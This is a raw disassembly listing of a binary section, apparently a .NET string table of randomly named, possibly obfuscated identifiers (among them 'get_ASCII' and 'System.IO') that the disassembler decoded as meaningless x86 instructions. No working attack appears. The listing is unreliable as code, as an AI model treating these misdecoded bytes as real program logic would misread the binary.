  407afb:	43                   	inc    %ebx
  407afc:	6a 57                	push   $0x57
  407afe:	5a                   	pop    %edx
  407aff:	43                   	inc    %ebx
  407b00:	49                   	dec    %ecx
  407b01:	47                   	inc    %edi
  407b02:	00 78 6a             	add    %bh,0x6a(%eax)
  407b05:	63 57 51             	arpl   %edx,0x51(%edi)
  407b08:	4d                   	dec    %ebp
  407b09:	79 59                	jns    0x407b64
  407b0b:	4a                   	dec    %edx
  407b0c:	54                   	push   %esp
  407b0d:	47                   	inc    %edi
  407b0e:	00 55 75             	add    %dl,0x75(%ebp)
  407b11:	73 63                	jae    0x407b76
  407b13:	4e                   	dec    %esi
  407b14:	4e                   	dec    %esi
  407b15:	52                   	push   %edx
  407b16:	70 6b                	jo     0x407b83
  407b18:	73 59                	jae    0x407b73
  407b1a:	56                   	push   %esi
  407b1b:	47                   	inc    %edi
  407b1c:	00 7a 43             	add    %bh,0x43(%edx)
  407b1f:	62 62 56             	bound  %esp,0x56(%edx)
  407b22:	48                   	dec    %eax
  407b23:	73 7a                	jae    0x407b9f
  407b25:	74 73                	je     0x407b9a
  407b27:	70 57                	jo     0x407b80
  407b29:	47                   	inc    %edi
  407b2a:	00 45 4d             	add    %al,0x4d(%ebp)
  407b2d:	62 72 52             	bound  %esi,0x52(%edx)
  407b30:	62 4b 56             	bound  %ecx,0x56(%ebx)
  407b33:	56                   	push   %esi
  407b34:	4c                   	dec    %esp
  407b35:	41                   	inc    %ecx
  407b36:	56                   	push   %esi
  407b37:	44                   	inc    %esp
  407b38:	6c                   	insb   (%dx),%es:(%edi)
  407b39:	72 47                	jb     0x407b82
  407b3b:	00 49 46             	add    %cl,0x46(%ecx)
  407b3e:	47                   	inc    %edi
  407b3f:	52                   	push   %edx
  407b40:	43                   	inc    %ebx
  407b41:	6e                   	outsb  %ds:(%esi),(%dx)
  407b42:	6d                   	insl   (%dx),%es:(%edi)
  407b43:	46                   	inc    %esi
  407b44:	59                   	pop    %ecx
  407b45:	72 6d                	jb     0x407bb4
  407b47:	72 47                	jb     0x407b90
  407b49:	00 49 79             	add    %cl,0x79(%ecx)
  407b4c:	68 4b 75 4b 66       	push   $0x664b754b
  407b51:	77 54                	ja     0x407ba7
  407b53:	48                   	dec    %eax
  407b54:	5a                   	pop    %edx
  407b55:	4c                   	dec    %esp
  407b56:	6b 7a 47 00          	imul   $0x0,0x47(%edx),%edi
  407b5a:	4b                   	dec    %ebx
  407b5b:	49                   	dec    %ecx
  407b5c:	5a                   	pop    %edx
  407b5d:	64 79 46             	fs jns 0x407ba6
  407b60:	79 52                	jns    0x407bb4
  407b62:	58                   	pop    %eax
  407b63:	64 74 45             	fs je  0x407bab
  407b66:	4a                   	dec    %edx
  407b67:	48                   	dec    %eax
  407b68:	00 58 71             	add    %bl,0x71(%eax)
  407b6b:	4d                   	dec    %ebp
  407b6c:	58                   	pop    %eax
  407b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6e:	49                   	dec    %ecx
  407b6f:	4b                   	dec    %ebx
  407b70:	64 67 43             	fs addr16 inc %ebx
  407b73:	67 48                	addr16 dec %eax
  407b75:	00 73 52             	add    %dh,0x52(%ebx)
  407b78:	69 48 77 4a 75 76 78 	imul   $0x7876754a,0x77(%eax),%ecx
  407b7f:	46                   	inc    %esi
  407b80:	74 6d                	je     0x407bef
  407b82:	46                   	inc    %esi
  407b83:	75 73                	jne    0x407bf8
  407b85:	72 6d                	jb     0x407bf4
  407b87:	48                   	dec    %eax
  407b88:	00 67 65             	add    %ah,0x65(%edi)
  407b8b:	74 5f                	je     0x407bec
  407b8d:	41                   	inc    %ecx
  407b8e:	53                   	push   %ebx
  407b8f:	43                   	inc    %ebx
  407b90:	49                   	dec    %ecx
  407b91:	49                   	dec    %ecx
  407b92:	00 77 50             	add    %dh,0x50(%edi)
  407b95:	6a 74                	push   $0x74
  407b97:	56                   	push   %esi
  407b98:	49                   	dec    %ecx
  407b99:	74 51                	je     0x407bec
  407b9b:	57                   	push   %edi
  407b9c:	49                   	dec    %ecx
  407b9d:	00 53 61             	add    %dl,0x61(%ebx)
  407ba0:	47                   	inc    %edi
  407ba1:	43                   	inc    %ebx
  407ba2:	75 71                	jne    0x407c15
  407ba4:	45                   	inc    %ebp
  407ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba6:	57                   	push   %edi
  407ba7:	49                   	dec    %ecx
  407ba8:	00 72 64             	add    %dh,0x64(%edx)
  407bab:	4b                   	dec    %ebx
  407bac:	6d                   	insl   (%dx),%es:(%edi)
  407bad:	71 46                	jno    0x407bf5
  407baf:	77 58                	ja     0x407c09
  407bb1:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407bb4:	49                   	dec    %ecx
  407bb5:	00 6a 72             	add    %ch,0x72(%edx)
  407bb8:	61                   	popa
  407bb9:	71 5a                	jno    0x407c15
  407bbb:	6c                   	insb   (%dx),%es:(%edi)
  407bbc:	6c                   	insb   (%dx),%es:(%edi)
  407bbd:	72 74                	jb     0x407c33
  407bbf:	6c                   	insb   (%dx),%es:(%edi)
  407bc0:	66 49                	dec    %cx
  407bc2:	00 4d 4d             	add    %cl,0x4d(%ebp)
  407bc5:	42                   	inc    %edx
  407bc6:	43                   	inc    %ebx
  407bc7:	53                   	push   %ebx
  407bc8:	54                   	push   %esp
  407bc9:	49                   	dec    %ecx
  407bca:	63 57 6f             	arpl   %edx,0x6f(%edi)
  407bcd:	76 78                	jbe    0x407c47
  407bcf:	55                   	push   %ebp
  407bd0:	70 4b                	jo     0x407c1d
  407bd2:	46                   	inc    %esi
  407bd3:	6d                   	insl   (%dx),%es:(%edi)
  407bd4:	49                   	dec    %ecx
  407bd5:	00 59 54             	add    %bl,0x54(%ecx)
  407bd8:	65 4e                	gs dec %esi
  407bda:	6a 50                	push   $0x50
  407bdc:	67 53                	addr16 push %ebx
  407bde:	6d                   	insl   (%dx),%es:(%edi)
  407bdf:	49                   	dec    %ecx
  407be0:	00 65 46             	add    %ah,0x46(%ebp)
  407be3:	79 50                	jns    0x407c35
  407be5:	70 72                	jo     0x407c59
  407be7:	77 41                	ja     0x407c2a
  407be9:	55                   	push   %ebp
  407bea:	56                   	push   %esi
  407beb:	4c                   	dec    %esp
  407bec:	74 49                	je     0x407c37
  407bee:	00 68 50             	add    %ch,0x50(%eax)
  407bf1:	6f                   	outsl  %ds:(%esi),(%dx)
  407bf2:	6a 79                	push   $0x79
  407bf4:	67 51                	addr16 push %ecx
  407bf6:	75 58                	jne    0x407c50
  407bf8:	41                   	inc    %ecx
  407bf9:	79 61                	jns    0x407c5c
  407bfb:	5a                   	pop    %edx
  407bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfd:	7a 49                	jp     0x407c48
  407bff:	00 5a 6d             	add    %bl,0x6d(%edx)
  407c02:	45                   	inc    %ebp
  407c03:	6b 72 57 61          	imul   $0x61,0x57(%edx),%esi
  407c07:	53                   	push   %ebx
  407c08:	55                   	push   %ebp
  407c09:	48                   	dec    %eax
  407c0a:	50                   	push   %eax
  407c0b:	4a                   	dec    %edx
  407c0c:	00 6a 59             	add    %ch,0x59(%edx)
  407c0f:	4c                   	dec    %esp
  407c10:	65 5a                	gs pop %edx
  407c12:	4e                   	dec    %esi
  407c13:	7a 41                	jp     0x407c56
  407c15:	45                   	inc    %ebp
  407c16:	78 74                	js     0x407c8c
  407c18:	49                   	dec    %ecx
  407c19:	54                   	push   %esp
  407c1a:	71 52                	jno    0x407c6e
  407c1c:	4a                   	dec    %edx
  407c1d:	00 4e 74             	add    %cl,0x74(%esi)
  407c20:	4d                   	dec    %ebp
  407c21:	56                   	push   %esi
  407c22:	64 6b 75 6a 4f       	imul   $0x4f,%fs:0x6a(%ebp),%esi
  407c27:	44                   	inc    %esp
  407c28:	64 4a                	fs dec %edx
  407c2a:	00 59 78             	add    %bl,0x78(%ecx)
  407c2d:	41                   	inc    %ecx
  407c2e:	42                   	inc    %edx
  407c2f:	63 4d 72             	arpl   %ecx,0x72(%ebp)
  407c32:	58                   	pop    %eax
  407c33:	63 7a 76             	arpl   %edi,0x76(%edx)
  407c36:	44                   	inc    %esp
  407c37:	70 4a                	jo     0x407c83
  407c39:	00 49 75             	add    %cl,0x75(%ecx)
  407c3c:	79 5a                	jns    0x407c98
  407c3e:	44                   	inc    %esp
  407c3f:	59                   	pop    %ecx
  407c40:	72 55                	jb     0x407c97
  407c42:	6c                   	insb   (%dx),%es:(%edi)
  407c43:	55                   	push   %ebp
  407c44:	71 4a                	jno    0x407c90
  407c46:	00 5a 4d             	add    %bl,0x4d(%edx)
  407c49:	49                   	dec    %ecx
  407c4a:	6d                   	insl   (%dx),%es:(%edi)
  407c4b:	59                   	pop    %ecx
  407c4c:	4b                   	dec    %ebx
  407c4d:	59                   	pop    %ecx
  407c4e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4f:	77 4a                	ja     0x407c9b
  407c51:	00 79 74             	add    %bh,0x74(%ecx)
  407c54:	67 45                	addr16 inc %ebp
  407c56:	76 4e                	jbe    0x407ca6
  407c58:	58                   	pop    %eax
  407c59:	69 72 4a 59 47 4b 00 	imul   $0x4b4759,0x4a(%edx),%esi
  407c60:	56                   	push   %esi
  407c61:	6b 41 41 78          	imul   $0x78,0x41(%ecx),%eax
  407c65:	7a 63                	jp     0x407cca
  407c67:	74 6b                	je     0x407cd4
  407c69:	6b 4b 00 57          	imul   $0x57,0x0(%ebx),%ecx
  407c6d:	78 73                	js     0x407ce2
  407c6f:	70 4d                	jo     0x407cbe
  407c71:	44                   	inc    %esp
  407c72:	42                   	inc    %edx
  407c73:	48                   	dec    %eax
  407c74:	5a                   	pop    %edx
  407c75:	4b                   	dec    %ebx
  407c76:	78 4b                	js     0x407cc3
  407c78:	00 63 4d             	add    %ah,0x4d(%ebx)
  407c7b:	42                   	inc    %edx
  407c7c:	68 70 68 4b 52       	push   $0x524b6870
  407c81:	51                   	push   %ecx
  407c82:	78 4b                	js     0x407ccf
  407c84:	00 69 54             	add    %ch,0x54(%ecx)
  407c87:	69 52 64 73 76 6e 49 	imul   $0x496e7673,0x64(%edx),%edx
  407c8e:	74 77                	je     0x407d07
  407c90:	59                   	pop    %ecx
  407c91:	70 43                	jo     0x407cd6
  407c93:	4c                   	dec    %esp
  407c94:	00 4a 78             	add    %cl,0x78(%edx)
  407c97:	78 56                	js     0x407cef
  407c99:	6a 79                	push   $0x79
  407c9b:	69 74 6a 68 63 79 67 	imul   $0x49677963,0x68(%edx,%ebp,2),%esi
  407ca2:	49 
  407ca3:	4c                   	dec    %esp
  407ca4:	00 45 55             	add    %al,0x55(%ebp)
  407ca7:	7a 4a                	jp     0x407cf3
  407ca9:	6d                   	insl   (%dx),%es:(%edi)
  407caa:	59                   	pop    %ecx
  407cab:	6d                   	insl   (%dx),%es:(%edi)
  407cac:	4a                   	dec    %edx
  407cad:	71 76                	jno    0x407d25
  407caf:	56                   	push   %esi
  407cb0:	52                   	push   %edx
  407cb1:	4c                   	dec    %esp
  407cb2:	00 74 62 6d          	add    %dh,0x6d(%edx,%eiz,2)
  407cb6:	52                   	push   %edx
  407cb7:	67 50                	addr16 push %eax
  407cb9:	76 56                	jbe    0x407d11
  407cbb:	74 66                	je     0x407d23
  407cbd:	55                   	push   %ebp
  407cbe:	53                   	push   %ebx
  407cbf:	4c                   	dec    %esp
  407cc0:	00 52 55             	add    %dl,0x55(%edx)
  407cc3:	6c                   	insb   (%dx),%es:(%edi)
  407cc4:	52                   	push   %edx
  407cc5:	47                   	inc    %edi
  407cc6:	71 4b                	jno    0x407d13
  407cc8:	79 55                	jns    0x407d1f
  407cca:	4c                   	dec    %esp
  407ccb:	00 6c 64 45          	add    %ch,0x45(%esp,%eiz,2)
  407ccf:	67 5a                	addr16 pop %edx
  407cd1:	77 76                	ja     0x407d49
  407cd3:	58                   	pop    %eax
  407cd4:	57                   	push   %edi
  407cd5:	4e                   	dec    %esi
  407cd6:	6c                   	insb   (%dx),%es:(%edi)
  407cd7:	43                   	inc    %ebx
  407cd8:	58                   	pop    %eax
  407cd9:	4c                   	dec    %esp
  407cda:	00 79 72             	add    %bh,0x72(%ecx)
  407cdd:	7a 74                	jp     0x407d53
  407cdf:	45                   	inc    %ebp
  407ce0:	69 79 6e 4e 67 4e 47 	imul   $0x474e674e,0x6e(%ecx),%edi
  407ce7:	75 6a                	jne    0x407d53
  407ce9:	4c                   	dec    %esp
  407cea:	00 6e 56             	add    %ch,0x56(%esi)
  407ced:	6d                   	insl   (%dx),%es:(%edi)
  407cee:	59                   	pop    %ecx
  407cef:	49                   	dec    %ecx
  407cf0:	70 61                	jo     0x407d53
  407cf2:	6b 41 6f 62          	imul   $0x62,0x6f(%ecx),%eax
  407cf6:	79 57                	jns    0x407d4f
  407cf8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf9:	4c                   	dec    %esp
  407cfa:	00 4a 6d             	add    %cl,0x6d(%edx)
  407cfd:	6b 51 56 61          	imul   $0x61,0x56(%ecx),%edx
  407d01:	62 4d 61             	bound  %ecx,0x61(%ebp)
  407d04:	75 4c                	jne    0x407d52
  407d06:	00 62 4b             	add    %ah,0x4b(%edx)
  407d09:	52                   	push   %edx
  407d0a:	59                   	pop    %ecx
  407d0b:	41                   	inc    %ecx
  407d0c:	6d                   	insl   (%dx),%es:(%edi)
  407d0d:	53                   	push   %ebx
  407d0e:	4f                   	dec    %edi
  407d0f:	55                   	push   %ebp
  407d10:	4e                   	dec    %esi
  407d11:	63 54 49 4d          	arpl   %edx,0x4d(%ecx,%ecx,2)
  407d15:	00 69 44             	add    %ch,0x44(%ecx)
  407d18:	61                   	popa
  407d19:	52                   	push   %edx
  407d1a:	63 6f 56             	arpl   %ebp,0x56(%edi)
  407d1d:	72 6a                	jb     0x407d89
  407d1f:	71 4d                	jno    0x407d6e
  407d21:	4d                   	dec    %ebp
  407d22:	00 77 62             	add    %dh,0x62(%edi)
  407d25:	6a 76                	push   $0x76
  407d27:	71 68                	jno    0x407d91
  407d29:	72 4e                	jb     0x407d79
  407d2b:	67 4f                	addr16 dec %edi
  407d2d:	4d                   	dec    %ebp
  407d2e:	00 78 58             	add    %bh,0x58(%eax)
  407d31:	41                   	inc    %ecx
  407d32:	56                   	push   %esi
  407d33:	72 6c                	jb     0x407da1
  407d35:	57                   	push   %edi
  407d36:	57                   	push   %edi
  407d37:	6e                   	outsb  %ds:(%esi),(%dx)
  407d38:	4f                   	dec    %edi
  407d39:	4d                   	dec    %ebp
  407d3a:	00 42 47             	add    %al,0x47(%edx)
  407d3d:	70 53                	jo     0x407d92
  407d3f:	77 64                	ja     0x407da5
  407d41:	52                   	push   %edx
  407d42:	48                   	dec    %eax
  407d43:	78 4c                	js     0x407d91
  407d45:	65 56                	gs push %esi
  407d47:	4d                   	dec    %ebp
  407d48:	00 67 78             	add    %ah,0x78(%edi)
  407d4b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d4c:	72 47                	jb     0x407d95
  407d4e:	4e                   	dec    %esi
  407d4f:	59                   	pop    %ecx
  407d50:	4c                   	dec    %esp
  407d51:	58                   	pop    %eax
  407d52:	65 57                	gs push %edi
  407d54:	4d                   	dec    %ebp
  407d55:	00 55 44             	add    %dl,0x44(%ebp)
  407d58:	77 66                	ja     0x407dc0
  407d5a:	42                   	inc    %edx
  407d5b:	58                   	pop    %eax
  407d5c:	68 43 53 64 4d       	push   $0x4d645343
  407d61:	00 69 71             	add    %ch,0x71(%ecx)
  407d64:	6c                   	insb   (%dx),%es:(%edi)
  407d65:	78 6b                	js     0x407dd2
  407d67:	44                   	inc    %esp
  407d68:	44                   	inc    %esp
  407d69:	58                   	pop    %eax
  407d6a:	72 63                	jb     0x407dcf
  407d6c:	72 4d                	jb     0x407dbb
  407d6e:	00 55 58             	add    %dl,0x58(%ebp)
  407d71:	64 4c                	fs dec %esp
  407d73:	58                   	pop    %eax
  407d74:	6b 62 63 6d          	imul   $0x6d,0x63(%edx),%esp
  407d78:	50                   	push   %eax
  407d79:	65 56                	gs push %esi
  407d7b:	4e                   	dec    %esi
  407d7c:	00 68 75             	add    %ch,0x75(%eax)
  407d7f:	4e                   	dec    %esi
  407d80:	6c                   	insb   (%dx),%es:(%edi)
  407d81:	71 64                	jno    0x407de7
  407d83:	6c                   	insb   (%dx),%es:(%edi)
  407d84:	61                   	popa
  407d85:	4a                   	dec    %edx
  407d86:	43                   	inc    %ebx
  407d87:	61                   	popa
  407d88:	5a                   	pop    %edx
  407d89:	4e                   	dec    %esi
  407d8a:	00 68 44             	add    %ch,0x44(%eax)
  407d8d:	50                   	push   %eax
  407d8e:	58                   	pop    %eax
  407d8f:	56                   	push   %esi
  407d90:	4d                   	dec    %ebp
  407d91:	72 41                	jb     0x407dd4
  407d93:	43                   	inc    %ebx
  407d94:	4c                   	dec    %esp
  407d95:	68 4e 00 73 4b       	push   $0x4b73004e
  407d9a:	55                   	push   %ebp
  407d9b:	6c                   	insb   (%dx),%es:(%edi)
  407d9c:	6c                   	insb   (%dx),%es:(%edi)
  407d9d:	6d                   	insl   (%dx),%es:(%edi)
  407d9e:	65 41                	gs inc %ecx
  407da0:	70 4a                	jo     0x407dec
  407da2:	47                   	inc    %edi
  407da3:	75 6e                	jne    0x407e13
  407da5:	4e                   	dec    %esi
  407da6:	00 4d 6d             	add    %cl,0x6d(%ebp)
  407da9:	50                   	push   %eax
  407daa:	4e                   	dec    %esi
  407dab:	43                   	inc    %ebx
  407dac:	5a                   	pop    %edx
  407dad:	61                   	popa
  407dae:	70 4e                	jo     0x407dfe
  407db0:	61                   	popa
  407db1:	4c                   	dec    %esp
  407db2:	45                   	inc    %ebp
  407db3:	78 4e                	js     0x407e03
  407db5:	00 62 77             	add    %ah,0x77(%edx)
  407db8:	6c                   	insb   (%dx),%es:(%edi)
  407db9:	67 6a 68             	addr16 push $0x68
  407dbc:	45                   	inc    %ebp
  407dbd:	4a                   	dec    %edx
  407dbe:	74 6e                	je     0x407e2e
  407dc0:	45                   	inc    %ebp
  407dc1:	4f                   	dec    %edi
  407dc2:	00 53 79             	add    %dl,0x79(%ebx)
  407dc5:	73 74                	jae    0x407e3b
  407dc7:	65 6d                	gs insl (%dx),%es:(%edi)
  407dc9:	2e 49                	cs dec %ecx
  407dcb:	4f                   	dec    %edi
  407dcc:	00 4e 4e             	add    %cl,0x4e(%esi)
  407dcf:	57                   	push   %edi
  407dd0:	5a                   	pop    %edx
  407dd1:	69 52 74 70 64 4b 75 	imul   $0x754b6470,0x74(%edx),%edx
  407dd8:	7a 6a                	jp     0x407e44
  407dda:	5a                   	pop    %edx
  407ddb:	4b                   	dec    %ebx
  407ddc:	51                   	push   %ecx
  407ddd:	4f                   	dec    %edi
  407dde:	00 75 55             	add    %dh,0x55(%ebp)
  407de1:	73 69                	jae    0x407e4c
  407de3:	6e                   	outsb  %ds:(%esi),(%dx)
  407de4:	64 65 6a 65          	fs gs push $0x65
  407de8:	68 64 4f 00 46       	push   $0x46004f64
  407ded:	4b                   	dec    %ebx
  407dee:	71 69                	jno    0x407e59
  407df0:	46                   	inc    %esi
  407df1:	52                   	push   %edx
  407df2:	52                   	push   %edx
  407df3:	5a                   	pop    %edx
  407df4:	43                   	inc    %ebx
  407df5:	51                   	push   %ecx
  407df6:	68 4f 00 57 42       	push   $0x4257004f
  407dfb:	51                   	push   %ecx
  407dfc:	70 41                	jo     0x407e3f
  407dfe:	75 70                	jne    0x407e70
  407e00:	52                   	push   %edx
  407e01:	72 70                	jb     0x407e73
  407e03:	51                   	push   %ecx
  407e04:	78 6e                	js     0x407e74
  407e06:	69 4f 00 48 61 48 44 	imul   $0x44486148,0x0(%edi),%ecx
  407e0d:	6d                   	insl   (%dx),%es:(%edi)
  407e0e:	77 6e                	ja     0x407e7e
  407e10:	5a                   	pop    %edx
  407e11:	52                   	push   %edx
  407e12:	45                   	inc    %ebp
  407e13:	58                   	pop    %eax
  407e14:	69 6d 4f 00 6a 50 6d 	imul   $0x6d506a00,0x4f(%ebp),%ebp
  407e1b:	69 66 67 48 62 4e 56 	imul   $0x564e6248,0x67(%esi),%esp
  407e22:	71 50                	jno    0x407e74
  407e24:	74 4f                	je     0x407e75
  407e26:	00 4f 65             	add    %cl,0x65(%edi)
  407e29:	6d                   	insl   (%dx),%es:(%edi)
  407e2a:	67 65 4e             	addr16 gs dec %esi
  407e2d:	76 74                	jbe    0x407ea3
  407e2f:	62 57 7a             	bound  %edx,0x7a(%edi)
  407e32:	63 7a 4f             	arpl   %edi,0x4f(%edx)
  407e35:	00 66 48             	add    %ah,0x48(%esi)
  407e38:	69 6f 51 51 63 6f 75 	imul   $0x756f6351,0x51(%edi),%ebp
  407e3f:	59                   	pop    %ecx
  407e40:	7a 6d                	jp     0x407eaf
  407e42:	44                   	inc    %esp
  407e43:	50                   	push   %eax
  407e44:	00 6d 6e             	add    %ch,0x6e(%ebp)
  407e47:	78 41                	js     0x407e8a
  407e49:	61                   	popa
  407e4a:	74 57                	je     0x407ea3
  407e4c:	63 53 51             	arpl   %edx,0x51(%ebx)
  407e4f:	45                   	inc    %ebp
  407e50:	50                   	push   %eax
  407e51:	00 58 73             	add    %bl,0x73(%eax)
  407e54:	51                   	push   %ecx
  407e55:	47                   	inc    %edi
  407e56:	76 59                	jbe    0x407eb1
  407e58:	74 72                	je     0x407ecc
  407e5a:	69 5a 54 50 00 48 56 	imul   $0x56480050,0x54(%edx),%ebx
  407e61:	7a 51                	jp     0x407eb4
  407e63:	72 41                	jb     0x407ea6
  407e65:	44                   	inc    %esp
  407e66:	58                   	pop    %eax
  407e67:	6a 56                	push   $0x56
  407e69:	50                   	push   %eax
  407e6a:	00 51 62             	add    %dl,0x62(%ecx)
  407e6d:	73 73                	jae    0x407ee2
  407e6f:	46                   	inc    %esi
  407e70:	66 7a 41             	data16 jp 0x407eb4
  407e73:	63 79 5a             	arpl   %edi,0x5a(%ecx)
  407e76:	54                   	push   %esp
  407e77:	51                   	push   %ecx
  407e78:	7a 6c                	jp     0x407ee6
  407e7a:	59                   	pop    %ecx
  407e7b:	50                   	push   %eax
  407e7c:	00 77 44             	add    %dh,0x44(%edi)
  407e7f:	65 4d                	gs dec %ebp
  407e81:	67 4c                	addr16 dec %esp
  407e83:	58                   	pop    %eax
  407e84:	68 6e 7a 71 61       	push   $0x61717a6e
  407e89:	50                   	push   %eax
  407e8a:	00 71 77             	add    %dh,0x77(%ecx)
  407e8d:	44                   	inc    %esp
  407e8e:	54                   	push   %esp
  407e8f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e90:	4b                   	dec    %ebx
  407e91:	61                   	popa
  407e92:	53                   	push   %ebx
  407e93:	62 50 00             	bound  %edx,0x0(%eax)
  407e96:	76 4e                	jbe    0x407ee6
  407e98:	75 62                	jne    0x407efc
  407e9a:	48                   	dec    %eax
  407e9b:	70 57                	jo     0x407ef4
  407e9d:	5a                   	pop    %edx
  407e9e:	45                   	inc    %ebp
  407e9f:	61                   	popa
  407ea0:	47                   	inc    %edi
  407ea1:	69 50 00 79 4a 62 76 	imul   $0x76624a79,0x0(%eax),%edx
  407ea8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea9:	7a 7a                	jp     0x407f25
  407eab:	49                   	dec    %ecx
  407eac:	57                   	push   %edi
  407ead:	4f                   	dec    %edi
  407eae:	52                   	push   %edx
  407eaf:	75 44                	jne    0x407ef5
  407eb1:	4d                   	dec    %ebp
  407eb2:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb3:	50                   	push   %eax
  407eb4:	00 75 6f             	add    %dh,0x6f(%ebp)
  407eb7:	4b                   	dec    %ebx
  407eb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb9:	58                   	pop    %eax
  407eba:	4e                   	dec    %esi
  407ebb:	62 76 68             	bound  %esi,0x68(%esi)
  407ebe:	6b 41 50 79          	imul   $0x79,0x50(%ecx),%eax
  407ec2:	50                   	push   %eax
  407ec3:	00 51 6d             	add    %dl,0x6d(%ecx)
  407ec6:	62 47 79             	bound  %eax,0x79(%edi)
  407ec9:	4c                   	dec    %esp
  407eca:	47                   	inc    %edi
  407ecb:	71 6c                	jno    0x407f39
  407ecd:	43                   	inc    %ebx
  407ece:	61                   	popa
  407ecf:	46                   	inc    %esi
  407ed0:	6b 57 42 51          	imul   $0x51,0x42(%edi),%edx
  407ed4:	00 4c 49 4e          	add    %cl,0x4e(%ecx,%ecx,2)
  407ed8:	6a 66                	push   $0x66
  407eda:	7a 47                	jp     0x407f23
  407edc:	61                   	popa
  407edd:	44                   	inc    %esp
  407ede:	50                   	push   %eax
  407edf:	4d                   	dec    %ebp
  407ee0:	51                   	push   %ecx
  407ee1:	00 49 4f             	add    %cl,0x4f(%ecx)
  407ee4:	69 65 46 72 53 64 79 	imul   $0x79645372,0x46(%ebp),%esp
  407eeb:	78 54                	js     0x407f41
  407eed:	4e                   	dec    %esi
  407eee:	51                   	push   %ecx
  407eef:	00 59 76             	add    %bl,0x76(%ecx)
  407ef2:	5a                   	pop    %edx
  407ef3:	54                   	push   %esp
  407ef4:	4a                   	dec    %edx
  407ef5:	6b 47 4d 77          	imul   $0x77,0x4d(%edi),%eax
  407ef9:	6a 6a                	push   $0x6a
  407efb:	51                   	push   %ecx
  407efc:	00 4d 75             	add    %cl,0x75(%ebp)
  407eff:	70 78                	jo     0x407f79
  407f01:	4c                   	dec    %esp
  407f02:	73 6e                	jae    0x407f72
  407f04:	74 56                	je     0x407f5c
  407f06:	50                   	push   %eax
  407f07:	79 4b                	jns    0x407f54
  407f09:	76 6f                	jbe    0x407f7a
  407f0b:	51                   	push   %ecx
  407f0c:	00 58 4b             	add    %bl,0x4b(%eax)
  407f0f:	77 64                	ja     0x407f75
  407f11:	43                   	inc    %ebx
  407f12:	6f                   	outsl  %ds:(%esi),(%dx)
  407f13:	48                   	dec    %eax
  407f14:	42                   	inc    %edx
  407f15:	62 79 7a             	bound  %edi,0x7a(%ecx)
  407f18:	4f                   	dec    %edi
  407f19:	6a 74                	push   $0x74
  407f1b:	43                   	inc    %ebx
  407f1c:	48                   	dec    %eax
  407f1d:	77 51                	ja     0x407f70
  407f1f:	00 58 74             	add    %bl,0x74(%eax)
  407f22:	4a                   	dec    %edx
  407f23:	69 41 6b 4a 67 54 42 	imul   $0x4254674a,0x6b(%ecx),%eax
  407f2a:	52                   	push   %edx
  407f2b:	00 5a 42             	add    %bl,0x42(%edx)
  407f2e:	45                   	inc    %ebp
  407f2f:	47                   	inc    %edi
  407f30:	55                   	push   %ebp
  407f31:	7a 56                	jp     0x407f89
  407f33:	4d                   	dec    %ebp
  407f34:	4c                   	dec    %esp
  407f35:	68 51 46 52 00       	push   $0x524651
  407f3a:	5a                   	pop    %edx
  407f3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407f3c:	44                   	inc    %esp
  407f3d:	65 46                	gs inc %esi
  407f3f:	4f                   	dec    %edi
  407f40:	59                   	pop    %ecx
  407f41:	59                   	pop    %ecx
  407f42:	55                   	push   %ebp
  407f43:	64 49                	fs dec %ecx
  407f45:	52                   	push   %edx
  407f46:	00 4d 67             	add    %cl,0x67(%ebp)
  407f49:	65 54                	gs push %esp
  407f4b:	63 70 50             	arpl   %esi,0x50(%eax)
  407f4e:	46                   	inc    %esi
  407f4f:	55                   	push   %ebp
  407f50:	52                   	push   %edx
  407f51:	00 76 47             	add    %dh,0x47(%esi)
  407f54:	6d                   	insl   (%dx),%es:(%edi)
  407f55:	63 51 7a             	arpl   %edx,0x7a(%ecx)
  407f58:	67 78 64             	addr16 js 0x407fbf
  407f5b:	52                   	push   %edx
  407f5c:	00 56 75             	add    %dl,0x75(%esi)
  407f5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407f60:	73 54                	jae    0x407fb6
  407f62:	43                   	inc    %ebx
  407f63:	76 4d                	jbe    0x407fb2
  407f65:	71 64                	jno    0x407fcb
  407f67:	67 52                	addr16 push %edx
  407f69:	00 55 6a             	add    %dl,0x6a(%ebp)
  407f6c:	45                   	inc    %ebp
  407f6d:	7a 42                	jp     0x407fb1
  407f6f:	72 59                	jb     0x407fca
  407f71:	6c                   	insb   (%dx),%es:(%edi)
  407f72:	4b                   	dec    %ebx
  407f73:	75 67                	jne    0x407fdc
  407f75:	56                   	push   %esi
  407f76:	63 4f 5a             	arpl   %ecx,0x5a(%edi)
  407f79:	6a 52                	push   $0x52
  407f7b:	00 4a 43             	add    %cl,0x43(%edx)
  407f7e:	53                   	push   %ebx
  407f7f:	50                   	push   %eax
  407f80:	7a 44                	jp     0x407fc6
  407f82:	4a                   	dec    %edx
  407f83:	79 6b                	jns    0x407ff0
  407f85:	52                   	push   %edx
  407f86:	00 75 55             	add    %dh,0x55(%ebp)
  407f89:	62 44 4b 64          	bound  %eax,0x64(%ebx,%ecx,2)
  407f8d:	4f                   	dec    %edi
  407f8e:	46                   	inc    %esi
  407f8f:	59                   	pop    %ecx
  407f90:	42                   	inc    %edx
  407f91:	61                   	popa
  407f92:	71 75                	jno    0x408009
  407f94:	52                   	push   %edx
  407f95:	00 45 67             	add    %al,0x67(%ebp)
  407f98:	6b 74 4c 72 43       	imul   $0x43,0x72(%esp,%ecx,2),%esi
  407f9d:	73 4b                	jae    0x407fea
  407f9f:	4a                   	dec    %edx
  407fa0:	71 41                	jno    0x407fe3
  407fa2:	53                   	push   %ebx
  407fa3:	00 76 49             	add    %dh,0x49(%esi)
  407fa6:	77 74                	ja     0x40801c
  407fa8:	56                   	push   %esi
  407fa9:	77 55                	ja     0x408000
  407fab:	73 44                	jae    0x407ff1
  407fad:	53                   	push   %ebx
  407fae:	00 72 67             	add    %dh,0x67(%edx)
  407fb1:	6a 59                	push   $0x59
  407fb3:	48                   	dec    %eax
